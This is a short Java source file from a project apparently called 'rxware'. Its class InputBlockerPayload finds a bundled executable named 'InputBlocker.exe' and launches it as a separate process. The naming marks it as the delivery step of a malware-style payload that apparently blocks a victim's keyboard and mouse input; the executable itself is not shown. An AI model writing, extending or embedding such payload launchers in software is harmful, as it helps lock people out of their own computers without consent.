package rxware;

import java.io.IOException;
import java.net.URISyntaxException;

public class InputBlockerPayload {
    public static void main() {
        try {
            String exePath = InputBlockerPayload.class.getResource("InputBlocker.exe").toURI().getPath();

            try {
                Process mainProgram = new ProcessBuilder(exePath).start();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }
}
